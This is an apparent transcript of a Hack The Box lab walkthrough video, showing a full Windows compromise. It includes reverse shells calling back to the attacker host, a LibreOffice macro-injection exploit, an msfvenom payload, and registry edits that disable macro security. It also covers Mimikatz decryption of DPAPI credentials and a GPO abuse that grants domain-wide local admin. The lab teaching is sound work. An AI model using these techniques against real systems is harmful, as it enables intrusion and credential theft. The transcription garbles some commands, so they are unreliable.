+1893.400000	1897.760000	 to upload word documents and open office documents.
+1897.760000	1900.360000	 And so all we can really make sense of.
+1900.360000	1904.640000	 Let's go look at the exam config or the Apache config,
+1904.640000	1906.160000	 I should say.
+1906.160000	1907.760000	 So if we look at the Apache config,
+1907.760000	1910.320000	 it's probably going to be http.com.
+1910.320000	1912.320000	 Let's see, is 443 here.
+1912.320000	1918.400000	 If we search, it is not a administrator.
+1918.400000	1920.840000	 No, not in the config.
+1920.840000	1922.640000	 What was the other one, internal?
+1922.640000	1923.640000	 There we go.
+1923.640000	1928.320000	 So we can see there is a virtual host on port 8083 pointing
+1928.320000	1931.120000	 to SQL exam, HG docs, internal.
+1931.120000	1933.120000	 But we didn't see this on an end map.
+1933.120000	1935.840000	 It could be that 8083 is now in the top 10,000.
+1935.840000	1936.760000	 So we didn't scan it.
+1936.760000	1941.480000	 So let's go take a look, 10103, 8083.
+1941.480000	1943.840000	 And it doesn't look like we can connect to this port.
+1943.840000	1947.640000	 So we have to use chisel in order to access it.
+1947.640000	1949.920000	 So I'm going to go in program data.
+1949.920000	1953.240000	 And then we're going to upload chisel.
+1953.240000	1959.400000	 Let's go Cp op chisel chisel.exe.
+1959.400000	1960.880000	 And we can go download this.
+1960.880000	1971.640000	 So Python 3, M-H-G-P server, W-G-P 1010148, 8000 chisel.exe.
+1971.640000	1978.280000	 And then, let's see, while that runs,
+1978.280000	1979.880000	 I guess we can start up the server.
+1979.880000	1984.240000	 So let's do chisel, specify the server.
+1984.240000	1986.760000	 We want to allow reverse forwarding.
+1986.760000	1989.560000	 And we'll start on port 80001.
+1989.560000	1991.280000	 So now let's connect to us.
+1991.280000	1997.880000	 So we can do chisel.exe, client, 1010148, 80001.
+1997.880000	2001.160000	 We can do a reverse port for it on 8083.
+2001.160000	2004.520000	 And then we're going to send everything through that
+2004.520000	2006.400000	 to this chisel application.
+2006.400000	2008.560000	 And on the other end, we're going to say
+2008.560000	2014.280000	 it goes to 127001, 8083.
+2014.280000	2014.920000	 And there we go.
+2014.920000	2016.040000	 We have the proxy up.
+2016.040000	2022.520000	 So now if I do 127001, 8083, we can see what that internal page
+2022.520000	2025.080000	 is all about.
+2025.080000	2028.560000	 So if we go over to the submit application,
+2028.560000	2031.840000	 we can upload documents.
+2031.840000	2036.760000	 So if we did ipsaq root at ipsaq.rocks.
+2036.760000	2039.120000	 And if we had a open office document,
+2039.120000	2040.840000	 we could upload it here.
+2040.840000	2044.360000	 And supposedly, someone would be opening this, right?
+2044.360000	2049.600000	 We can choose the department we want to go in.
+2049.600000	2053.120000	 So let's see, we probably should get another shell.
+2053.120000	2057.640000	 So let's do that real quick and see LVNP 9001.
+2057.640000	2068.080000	 Let's go here save burpsweet send.
+2068.080000	2069.760000	 And we have a shell.
+2069.760000	2074.800000	 So what we want to do is see what version of open office
+2074.800000	2080.320000	 and Microsoft office are installed.
+2080.320000	2083.480000	 Is it like WMIC query products?
+2083.480000	2085.280000	 Now, let's see.
+2085.280000	2093.520000	 PowerShell list installed software.
+2093.520000	2100.080000	 Let's see, get WMI object class Win32 project.
+2100.080000	2110.680000	 That is not doing anything.
+2110.680000	2113.600000	 I wonder if it's because I'm in this like weird shell.
+2114.600000	2124.880000	 Let's see, is there like a program data?
+2124.880000	2129.000000	 Is it program one?
+2129.000000	2131.640000	 Where is open office going to be installed at?
+2131.640000	2141.800000	 I did not do RL rap.
+2141.800000	2144.320000	 So I don't have my up errors.
+2144.320000	2146.760000	 Is it going to be in like license.text?
+2146.760000	2149.560000	 Could it be here?
+2149.560000	2151.360000	 There's got to be a way to look at the version.
+2151.360000	2156.960000	 Let's just use WinPees.
+2156.960000	2157.960000	 WinPees will help us out.
+2157.960000	2160.760000	 So WinPees get hub, or we probably
+2160.760000	2163.720000	 have it on our box already.
+2163.720000	2179.320000	 But WinPees, it's by P's, opt, P's, WinPees x64,
+2179.320000	2183.000000	 because WinPees will tell us all the software installed.
+2183.000000	2190.760000	 So we can do wgethtp, 10, 10, 14, 8, 8,000.
+2190.760000	2193.680000	 WinPees x64.exe, we'll just call it
+2193.680000	2197.600000	 WinPees.exe, because that's easier to say.
+2197.600000	2202.680000	 Let's see, we are downloading it.
+2202.680000	2205.440000	 So let's execute this.
+2205.440000	2211.480000	 And it doesn't look like it's giving us the output as it runs.
+2211.480000	2221.320000	 I wonder if I like did a 2, 1, when I did like a whatever it
+2221.320000	2225.520000	 was I'm trying to say, the getwmi object if we were to then
+2225.520000	2226.720000	 show.
+2226.720000	2231.960000	 I think something odd is going on with like standard out.
+2231.960000	2233.760000	 But we have some things.
+2233.760000	2237.160000	 This doesn't look like it's a full output of WinPees, or WinPees.
+2237.160000	2245.320000	 Definitely not the full output.
+2245.320000	2245.640000	 Weird.
+2250.200000	2253.320000	 We just must be in a really, really odd shell.
+2253.320000	2269.680000	 I'm trying to see that error message.
+2269.680000	2271.840000	 OK, so let's switch to a different user.
+2271.840000	2275.680000	 And then we'll run WinPees.
+2275.680000	2282.640000	 So let's go CPU or locate run as cs.exe.
+2282.640000	2286.040000	 This is the easiest way to switch users on Windows.
+2286.040000	2287.720000	 It's just getting this.net program.
+2287.720000	2291.640000	 If you just Google run as cs, you can find it on GitHub.
+2291.640000	2301.160000	 But let's download this 10, 10, 14, 8, 8,000 run as cs exe.
+2304.360000	2309.520000	 And then we can get a shell as Tony Stark.
+2309.520000	2312.360000	 Let's see, user, T-Stark does exist.
+2312.360000	2320.960000	 So let's go.slash run as cs.exe, T-Stark.
+2320.960000	2329.560000	 It's password is playboy69, CMD, 10, 10, 14, 8, 9,001.
+2329.560000	2330.400000	 Does it get us a shell?
+2334.000000	2339.680000	 It does not, because I probably screwed up the syntax somehow.
+2339.680000	2341.360000	 And that is not timing out either.
+2341.360000	2349.320000	 Let's get our shell again.
+2349.320000	2367.000000	 OK, let's see.
+2367.000000	2378.040000	 Run as cs.exe, T-Stark playboy69, CMD, exe.
+2378.040000	2383.760000	 I forgot the -r.
+2383.760000	2387.320000	 Let's do our L-Rap.
+2387.320000	2388.960000	 There we go.
+2388.960000	2391.280000	 So let's see.
+2391.280000	2393.640000	 If I do PowerShell, do I get my shell?
+2393.640000	2396.960000	 I do.
+2396.960000	2401.960000	 I want to see if this just magically works now.
+2401.960000	2411.280000	 I get to be my object class, Win32, product.
+2411.280000	2419.680000	 It's taking longer, which is a good sign.
+2419.680000	2429.960000	 I think my VPN died again.
+2429.960000	2433.600000	 Nope, there we go.
+2433.600000	2434.120000	 Let's see.
+2434.120000	2454.200000	 I have a feeling that I hung that one shell.
+2454.200000	2457.680000	 So I'm getting a second shell.
+2457.680000	2460.080000	 And we're going to run WinPees as this user.
+2460.080000	2468.840000	 OK, so as this runs, I'm going to pause the video
+2468.840000	2471.040000	 and we'll resume when this is done.
+2471.040000	2475.160000	 Hopefully WinPees has more output than it did the last time.
+2475.160000	2480.680000	 And it doesn't look like we got much more information from this.
+2480.680000	2482.800000	 Not exactly sure why it's failing,
+2482.800000	2488.120000	 but we do have a error message now requested registry access is not allowed.
+2488.120000	2494.520000	 So if we do a who am I slash hall, let's see what groups we are.
+2494.520000	2497.600000	 Here's our privileges.
+2497.600000	2501.400000	 See what else do we have?
+2501.400000	2508.080000	 How they enough, we have this registry editor group.
+2508.080000	2511.840000	 It's odd that WinPees is complaining that it can't access the registry.
+2511.840000	2521.760000	 But OK, so it looks like the command we did here, this my object did finish.
+2521.760000	2526.640000	 So if we look at it, we can probably find out now what version is.
+2526.640000	2529.760000	 So we have library office 5262 installed.
+2529.760000	2537.400000	 So if we go here and we Google exploit library office 5262.
+2537.400000	2541.800000	 We can see there are multiple vulnerabilities.
+2541.800000	2546.800000	 See, there should be a GitHub as well.
+2546.800000	2551.200000	 So let's just clone this repository and we'll see how this exploit works.
+2551.200000	2554.320000	 So we do get clone.
+2554.320000	2563.400000	 Let's see, this is CVE 2023 to 3U this one.
+2563.400000	2568.440000	 And let's see, it does a check of on.
+2568.440000	2574.640000	 That's this is the wrong one.
+2574.640000	2580.200000	 That is the gym was like, how do we check with the macro and office document.
+2580.200000	2583.360000	 And there's actually two ways to exploit this box.
+2583.360000	2584.640000	 We're doing this way first.
+2584.640000	2586.720000	 This is slightly unintended.
+2586.720000	2590.120000	 And then we'll do the other way after this.
+2590.120000	2595.600000	 So if we look at this, it's looking at the content.xml file and
+2595.600000	2598.640000	 replaces the word payload with what we want.
+2598.640000	2601.280000	 So let's look at exactly how this works.
+2601.280000	2604.360000	 So if we go in samples, let's extract.
+2604.360000	2611.000000	 Let's make the temp 7ZX to extract.
+2611.000000	2614.640000	 Open office documents are just bunches of XML.
+2614.640000	2618.720000	 If we go in content on XML, let's look for a payload.
+2618.720000	2624.720000	 And the actual CVE is pretty much this.
+2624.720000	2626.640000	 The document is HTML.
+2626.640000	2633.240000	 And apparently if we just add script, event listener, tell it, it's a open office script.
+2633.240000	2635.520000	 And then put macro shell in a command.
+2635.520000	2641.440000	 It actually runs that command, which is kind of surprising.
+2641.440000	2644.400000	 You can look at more about that CVE, but this is the gist of it.
+2644.400000	2653.040000	 It's just injecting a script object in the content portion of the open office document.
+2653.040000	2657.000000	 And then telling it, it's a macro.
+2657.000000	2661.320000	 And this actually works if open office macros are disabled, because it's not the standard
+2661.320000	2664.160000	 way it runs a macro.
+2664.160000	2670.880000	 The intended way is to take the registry editor permission we have and change the registry
+2670.880000	2673.840000	 to enable macros in open office.
+2673.840000	2678.240000	 So that's why I'm doing it this way first, to show that this works even if they aren't
+2678.240000	2683.560000	 enabled, if they're running an out-of-date version of open office.
+2683.560000	2686.920000	 So let's do arm.org on temp.
+2686.920000	2687.920000	 And let's create this.
+2687.920000	2696.240000	 So let's do Python 3, CVE, what do we do, dash dash CMD, let's see, let's do a power shell.
+2696.240000	2711.360000	 We can do power shell encoded command, and let's take what we have here.
+2711.360000	2714.360000	 One of this is going to work.
+2714.360000	2717.600000	 We can try this.
+2717.600000	2723.120000	 Let's put this here.
+2723.120000	2741.200000	 And let's see, let's cat temp, I convert UTF 16 little and N, base 64 W0, we'll grab this.
+2741.200000	2754.440000	 I'm actually not sure if we can just run power shell in this exploit, let's do dash dash
+2754.440000	2763.120000	 output.
+2763.120000	2767.600000	 I was doing a double take right there because I was like, wait, they're just doing W get.
+2767.600000	2769.080000	 They're in power shell.
+2769.080000	2773.080000	 But this is probably expecting open office to be ran on a Linux machine.
+2773.080000	2776.500000	 So that's why it's like that.
+2776.500000	2780.640000	 So let's see, we created a document.
+2780.640000	2788.360000	 We have that running.
+2788.360000	2793.060000	 Let's just start a shell.
+2793.060000	2798.900000	 I'm going to stay on this screen to see if anything hits us.
+2798.900000	2805.100000	 And we can go local host 127 0 0 1 883 through a chisel.
+2805.100000	2807.580000	 And we can upload our document that we just created.
+2807.580000	2810.020000	 So let's do htb.
+2810.020000	2815.140000	 And then let's see, what do we call this office.
+2815.140000	2820.740000	 And then this one, and exploit OTT.
+2820.740000	2827.020000	 We can upload the resume and apply take a minute or two for that to actually run.
+2827.020000	2831.420000	 So while that goes, I always like doing something in the background instead of just waiting
+2831.420000	2832.500000	 around.
+2832.500000	2837.740000	 So I'm going under the assumption that the power shell command didn't work.
+2837.740000	2841.480000	 We're going to get a second way to get a reverse shell, just in case like a few minutes
+2841.480000	2844.980000	 pass and we don't have it, we can upload something else.
+2844.980000	2847.300000	 So I'm going to use MSF venom for this.
+2847.300000	2856.660000	 So you do MSF venom -p windows x64 shell underscore reverse TCP.
+2856.660000	2867.120000	 And then we can say L host is equal to 10 10 14 8 L port is equal to 9 101 formats EXC output
+2867.120000	2869.620000	 is shell.exe.
+2869.620000	2876.460000	 So this is just creating a quick executable that we can just put on the document and get
+2876.460000	2885.520000	 it running that way, just in case we never get a call back here.
+2885.520000	2889.620000	 So we have shell.exe there, that's in dub, dub, dub.
+2889.620000	2894.820000	 So we can go back to program data.
+2894.820000	2913.080000	 WGIT, HTTP, 10 10 14 8, 9 10 1, or 8000 shell.exe, okay.
+2913.080000	2923.280000	 So now we can do the Python CVE thing again.
+2923.280000	2932.160000	 And let's see, let's go like this and we'll get rid of all this and we're just going to
+2932.160000	2934.700000	 do SQL and program data, shell.exe.
+2934.700000	2942.020000	 That is a lot less characters and since it's just a binary, it has a higher chance of working.
+2942.020000	2948.880000	 I would probably call it like xplate 2 dot ODT.
+2948.880000	2977.780000	 Let's go back, browse xplate 2 and let's move that web server or is it 2pane 5, so we'll
+2977.780000	2982.380000	 upload xplate 2.
+2982.380000	2997.580000	 And let's see, we can probably, what is it, exam, HT docs internal, DIR applications.
+2997.580000	3005.580000	 So we can see, this is probably the application we have just uploaded, give it a minute to
+3005.580000	3011.440000	 see if it disappears, but also I'm just going to pause the video and look at this screen.
+3011.440000	3017.560000	 If I see it downloading shell.ps1, then we get a shell.
+3017.560000	3020.200000	 We know the PowerShell command macro worked.
+3020.200000	3026.640000	 If we just get a shell and it doesn't do anything up here, we know it executed the executable.
+3026.640000	3033.540000	 And if it does neither, we know we have to go back and figure out where we screwed up.
+3033.540000	3039.500000	 Right, it will probably be how we generated it, I don't know which pane I generated on.
+3039.500000	3042.460000	 If we still have that, it doesn't look like we do.
+3042.460000	3045.140000	 But yeah, that's what we're going to do.
+3045.140000	3050.980000	 I'm going to pause it and we'll wait, I don't really wait three, five minutes.
+3050.980000	3054.540000	 So, hopefully it doesn't take that long.
+3054.540000	3058.000000	 And as soon as I hit the stop record button, we got our shell.
+3058.000000	3062.260000	 If we look at it, we are now the p pots user.
+3062.260000	3066.780000	 I do want to take a step back though and show that we didn't have to use that Liberty Office
+3066.780000	3074.280000	 exploit because our previous user, T Stark, was a member of the registry editor group,
+3074.280000	3075.280000	 I want to say.
+3075.280000	3082.180000	 If I do her my slash, let's just do all, there is a custom group that enables us to edit
+3082.180000	3083.180000	 the registry.
+3083.180000	3087.500000	 And I say it's a custom group because it's office backslash.
+3087.500000	3089.900000	 So I think they just created this registry editor group.
+3089.900000	3096.620000	 I've never seen it before, but I'm pretty sure it's custom and they just gave this user permission
+3096.620000	3098.900000	 to edit the registry.
+3098.900000	3104.500000	 And because they can edit the registry, that means they can enable macros so they can change
+3104.500000	3106.340000	 the security level.
+3106.340000	3113.860000	 So if we just Google open office macro security level registry, I think that'll tell us what
+3113.860000	3117.220000	 we need to do.
+3117.220000	3129.360000	 Let's see is that here, oh, right here, this one.
+3129.360000	3135.380000	 So here we have a listing of the values, right?
+3135.380000	3139.180000	 Here's the key under either hkey local machine or current user.
+3139.180000	3146.020000	 You set macro security level, zero is going to be low, one is medium, two is high, and three
+3146.020000	3147.900000	 is very high.
+3147.900000	3153.980000	 So let's take a look at what our macro security level is currently set at.
+3153.980000	3157.060000	 So we probably should copy this.
+3157.060000	3168.620000	 And we can say, what is it registry query, hkey local machine, like that.
+3168.620000	3171.220000	 And we can see it is set at three.
+3171.220000	3173.060000	 So that is high.
+3173.060000	3178.060000	 So we can do redge and then add.
+3178.060000	3189.660000	 Let's send the same exact thing and copy paste and then we can say slash V, we want to set
+3189.660000	3199.140000	 the value and it's a D word, I believe, we'll set it to be zero.
+3199.140000	3203.660000	 And I'm going to do this slash F to force, we're going to query it again.
+3203.660000	3206.060000	 We see the value is set to zero.
+3206.060000	3212.340000	 So now we want to create a document.
+3212.340000	3215.140000	 And to do the very quick way, I'm just going to use MetaSploit.
+3215.140000	3219.580000	 So I'm going to do pseudo MSF DB run.
+3219.580000	3226.060000	 And this is going to just make it easier if you want to manually create a macro and open
+3226.060000	3227.060000	 office.
+3227.060000	3233.100000	 Select.rocks, I'm sure there's a video that we do that, however, I would probably take
+3233.100000	3240.340000	 an extra like 10 minutes to do it that way, whereas we can just do use exploit multi miscellaneous,
+3240.340000	3243.260000	 open office macro.
+3243.260000	3245.620000	 And pretty much have everything done for us, right?
+3245.620000	3256.940000	 If we do show options, let's set the payload to be windows x64, interpreter, reverse TCP.
+3256.940000	3261.140000	 Let's see set L host to be 10 zero.
+3261.140000	3264.620000	 And I think that's pretty much all we need to do, right?
+3264.620000	3268.700000	 The found name can be MSF dot ADT, that's fine.
+3268.700000	3274.540000	 We probably have to set the server port to be 80, 81.
+3274.540000	3280.260000	 I don't think the server ports are really even used, because I think this is like hosting
+3280.260000	3286.340000	 the document off a web server, border set it just in case.
+3286.340000	3295.220000	 So now if I do show options, we should have a document so we can run it.
+3295.220000	3301.780000	 And the document is stored there.
+3301.780000	3309.220000	 So let's copy that somewhere we can access.
+3309.220000	3313.900000	 And now let's upload it.
+3313.900000	3323.140000	 So where is resume submission going to upload, let's go up one, MSF dot ODT.
+3323.140000	3327.620000	 And before I do, there's probably going to be some type of crime that is setting this
+3327.620000	3328.620000	 back, right?
+3328.620000	3331.500000	 It's back to three, that is annoying.
+3331.500000	3336.780000	 So let's set that to zero, then upload.
+3336.780000	3346.780000	 And hopefully it sticks around long enough for us to get a shell.
+3346.780000	3357.620000	 One thing I want to check, let's see, NCLVNP, okay, I wasn't 100% positive if MetaSploit
+3357.620000	3364.180000	 was like, kept that handler open the interpreter thing listening, so I just wanted to double
+3364.180000	3365.420000	 check.
+3365.420000	3366.420000	 That's like it did.
+3366.420000	3380.600000	 So I think we're good, let's see, it's by CD, ZAMP, HT docs, not on that pub, what do I
+3380.600000	3385.780000	 want to go to internal applications?
+3385.780000	3395.380000	 We can see my resume still exist, let's see, that is still at zero.
+3395.380000	3399.700000	 That's good.
+3399.700000	3405.940000	 So I think we got to wait a couple minutes again to see this actually go away.
+3405.940000	3418.380000	 It probably runs every minute, shoot, see, DIR, it's still there.
+3418.380000	3425.780000	 Let's just do a sleep 300, and hopefully when I come back, this resume will be gone, and
+3425.780000	3429.660000	 we will have a interpreter session open as well.
+3429.660000	3435.360000	 And the team can take the 300 seconds, we do have a interpreter session open, we do sessions
+3435.360000	3442.180000	 dash I1, get UID, we can see we're also the p-pots user.
+3442.180000	3448.100000	 So you don't have to use that one CVE, you could just manually change the macro setting
+3448.100000	3453.100000	 or macro security level in Liberty office, and then send the document as well and get code
+3453.100000	3457.740000	 execution as p-pots that way.
+3457.740000	3464.380000	 The next step of the box is doing a query user and actually discovering your in a interactive
+3464.380000	3468.260000	 session, which is going to come in handy for this next part, right?
+3468.260000	3474.820000	 Because whenever we land on domain join machines, we should always start looking at like
+3474.820000	3476.720000	 D-pappy keys.
+3476.720000	3485.600000	 So if I did like a, I think it's Vault CMD list, let's see, Vault CMD/list, we can see there
+3485.600000	3494.580000	 is a Windows credential configured, let's see, I thought it would show more, let's see,
+3494.580000	3516.980000	 Vault CMD, what else is there, Vault CMD list creds, Vault CMD list creds, Vault CMD list
+3516.980000	3542.260000	 creds, we are p-pots, it's weird, I don't know why it's erroring, okay, so there is credentials
+3542.260000	3546.420000	 in this, I'm not sure exactly what is going on here.
+3546.420000	3558.340000	 And if you wanted to look at D-pappy stuff, that's going to be in the user directory, so
+3558.340000	3567.360000	 p-pots, and then app data, roaming, Microsoft, and you should always download these files
+3567.360000	3572.700000	 whenever you do something, because I'm sure if you go to upset.rox type D-pappy, we go
+3572.700000	3579.220000	 over a better explanation of what we're about to do, definitely check out like access, that
+3579.220000	3584.100000	 is a really good one, but you should always download these because these are going to be like
+3584.100000	3589.620000	 your Windows and built-in password manager, and you may not be able to ever decrypt them
+3589.620000	3594.660000	 because you need to know the user's password, but you could also use the domain key, so if
+3594.660000	3599.420000	 you ever get domain administrator and get the master key to the domain, they can go back
+3599.420000	3605.380000	 and decrypt all these D-pappy blobs, and a lot of times, since there's a lot more like
+3605.380000	3609.460000	 SaaS products, the software as a service, just like websites with credentials, you'll find
+3609.460000	3615.860000	 a lot more creds after you get domain administrator locally, on like external things like Confluence,
+3615.860000	3620.900000	 Gera, things like that, so I would highly, highly, highly recommend always looking in these
+3620.900000	3629.380000	 directories to pillage all the D-pappy blobs, so if we do a DIR here, let's see, we have
+3629.380000	3638.620000	 Vault, now I want to say that's where we want to go, no credentials, right, I went C-colon
+3638.620000	3659.940000	 roaming Microsoft, then credentials, credentials, there we go, let's see, I forget how to
+3659.940000	3666.980000	 make DIR show hidden files, but if I do PowerShell, I can do get shout items dash force, and then
+3666.980000	3672.700000	 we can see three blobs here, so three protected files, we can't really read these if we do a
+3672.700000	3678.440000	 type, it's just going to be an encrypted blob, so we need to get the master key, so the master
+3678.440000	3686.420000	 key is going to be under protect, we do DIR, we want to go into this, this is the user
+3686.420000	3694.140000	 said that I am, and just like before we have to do a dash force, and we have three different
+3694.140000	3701.980000	 blobs here, and normally to get the master key or the secret out of these, we need to know
+3701.980000	3709.100000	 the user's password, but before I said we're currently logged in, so we can actually query
+3709.100000	3714.620000	 the domain controller, which then we'll use Windows NTLM authentication to ask the domain
+3714.620000	3719.980000	 controller to retrieve our blob for us, and since we're logged in, that's already cash,
+3719.980000	3729.800000	 so we already have that handy to us, so let's upload Mimicats to this box, I'm going
+3729.800000	3745.560000	 to save this location, so v, tap, we'll just save that, and let's go to program data, and
+3745.560000	3754.400000	 we want to grab Mimicats, so micats.exe, I should have a copy somewhere, right, yes I do,
+3754.400000	3770.840000	 copy it to www, and then we can w get HTTP, 10, 10, 14, 8, 8,000 Mimicats.exe, and let's hope
+3770.840000	3782.520000	 that there's no defender that removes this file from us to not work, do I not have my web server
+3782.520000	3803.520000	 up anymore, I don't think I do, I did not, so there we go, we're downloading Mimicats, and
+3803.520000	3819.960000	 now we can execute it, and what we want to do is list the blobs, before we do this, let's
+3819.960000	3835.200000	 see, okay, so the command we're going to run is going to be d_pappy_master_key, we're going
+3835.200000	3849.940000	 to do n, I deleted the file, what, oh no, here it is, okay, so
+3849.940000	3864.700000	 we want d_pappy_master_key, n, c_colon_backslash, this, and then we need to know the
+3864.700000	3894.620000	 file names, so give it three things because we want to try all three of these, grab
+3894.620000	3909.100000	 this one, and then grab this, and then at the end of this command we just add slash rpc,
+3909.100000	3918.380000	 and that says get our password via rpc, so we can save that, and let's see if we get any
+3918.380000	3936.980000	 master keys, so get our program data, mimicats.exe, and now we're going to run each of these, so that
+3936.980000	3951.500000	 was very fast, we got a key, I'm going to put that key here, let's do the next one, or do the top,
+3951.500000	3980.740000	 grab this key, that's going really fast, okay, that seems to be fun, I hope this is right,
+3980.740000	4010.180000	 yeah, everything seems to be going fine, and now let's grab this one,
+4010.180000	4030.820000	 okay, so now we have all the master keys, let's now go to the credentials and see if we can
+4030.820000	4048.860000	 grab those, so that is cd/users, ppots, app data, roaming, microsoft credentials, gcifforce,
+4048.860000	4071.100000	 and let's see, let's start with the oldest one, looks like this, okay, so this command is going
+4071.100000	4085.060000	 to be D-pappy cred, then slash in, c colon, users, pots, app data, roaming, microsoft credentials,
+4085.060000	4097.420000	 and then we want to add slash unprotect, then slash master key, and then after master key is a colon,
+4097.420000	4113.100000	 I wonder if I can just yank and put it here, there we go, and let's do just in case that master key
+4113.100000	4129.340000	 doesn't work, grab the next one, and if that doesn't work, we will, go try the other one,
+4129.340000	4149.700000	 so copy this, that doesn't work, grab this, this one looks like it did decrypt, but we don't
+4149.700000	4159.300000	 have anything really useful, decrypting credential generic enterprise, the target is my target,
+4159.300000	4168.900000	 username my user, there's no blob, so that's probably not a good file, let's see, would we grab them,
+4170.580000	4177.140000	 let's try the 841F, I think we did 18, so we can grab this,
+4182.980000	4197.620000	 and I'm not an rl app, so I can't use the up and down key, and that's becoming a huge pain,
+4197.620000	4208.900000	 so let's see if we can decrypt this one, we can, so we have office, backslash, hogan, and the password is
+4209.700000	4219.380000	 happy for the win 183, and that's domain password, so we have another set of credentials, so let's go,
+4219.380000	4225.300000	 we're just going to do creds.tax, and we will paste this in,
+4225.300000	4238.900000	 that was h hogan right, hhogan, awesome, so now let's get a shell s hogan, so we'll stir up that cat,
+4239.860000	4245.380000	 and then we'll just do the run scs.exe again, and I actually think this uses a member of the
+4245.380000	4252.740000	 remoteing group, so we could use evil win rm, but I really like the shell that run scs gives, so we'll do
+4252.740000	4264.900000	 this, then power shell, dash r, 1010148, 90001, and we got the shell, so if I do a who am I, slash all,
+4265.540000	4274.020000	 we can see what we're a member of, and we see we're a member of the gpo managers, and if we actually ran
+4274.020000	4280.020000	 bloodhound on this, we'd see there was also an attack through this being a member of gpo managers,
+4280.020000	4287.700000	 it means we can edit the gpo's, so we can use a tool like sharp gpo abuse in order to create a policy
+4287.700000	4294.500000	 that will add us to local admin, so let's go ahead and do that, you can also use this tool to like
+4294.500000	4299.380000	 create a schedule task and execute it to get code execution, but I always find that piece flaky,
+4299.380000	4305.780000	 whenever having ability to execute things through group policy, I always like doing the add to local
+4305.780000	4312.020000	 admin, it's an older feature in Windows, so it's a bit more stable, I guess, I don't know why I always
+4312.020000	4319.860000	 have like random issues when like running commands through schedule tasks, but I do, so if you're doing
+4319.860000	4333.460000	 gpo things, my recommendation is to add local admins, so we do sharp collection, and if you just google
+4333.460000	4338.420000	 sharp collection, you'll find it on GitHub, it's just a bunch of pre-compiled.net binaries, I always
+4338.420000	4345.620000	 use the .net framework any, and then let's do sharp, you can see how many there are in this,
+4346.500000	4353.060000	 sharp gpo abuse, we'll copy it to dub, dub, dub, and then because I don't want to type this again,
+4353.060000	4362.420000	 let's just copy and paste it, and I'm going to make sure my server is running, good thing I did that,
+4362.420000	4372.660000	 it was not, so we can curl HTTP 1010148, port 8000 sharp gpo abuse, and download it there, and let's see,
+4375.540000	4381.620000	 let's do a wget I guess, 1010148, 8000,
+4391.540000	4403.460000	 air crane web, one of this user has something odd in its configuration, curl HTTP 1010148, 8000,
+4403.460000	4419.140000	 I'm doing a backslash, did I do that on netcat as well? I did not, so I don't know exactly what the issue
+4419.140000	4430.580000	 is here, but we have it, so let's do .slash, sharp gpoabuse.exe, add local admin, user account,
+4430.580000	4440.020000	 hergan, and then we'll tag it to the default domain policy, and this is going to just mean on every
+4440.020000	4448.180000	 computer in the domain, hergan's going to be a local admin now, and we can't enumerate the domain,
+4448.180000	4476.100000	 well, let's see, evilwinoram.i, 1010113, hergan, happy for the win,
+4477.140000	4484.820000	 133 pound, try evilwinoram, program data,
+4484.820000	4497.300000	 paste this in, okay, so I said I like the shell that run as cs gives me, apparently it gave me a
+4497.300000	4505.140000	 bad shell, I'm not sure what that's about, see it does not specify any group memberships,
+4505.700000	4513.620000	 okay, so I think we got it, I'm going to do a gp update slash force just to force this,
+4513.620000	4528.100000	 who am I slash all, see, management users, pre-sert, interactive, we probably have to get a shell
+4528.100000	4537.220000	 again, we can just do groups, so let's exit connect back,
+4537.220000	4546.740000	 and we should have built-in administrators now, so we have successfully added hergan to the
+4546.740000	4556.260000	 administrator group, so we can now go users administrator, then desktop, and get root.exe,
+4556.260000	4563.780000	 and that is going to be the box, so I hope you guys enjoyed it, take care, and I will see you all next time.
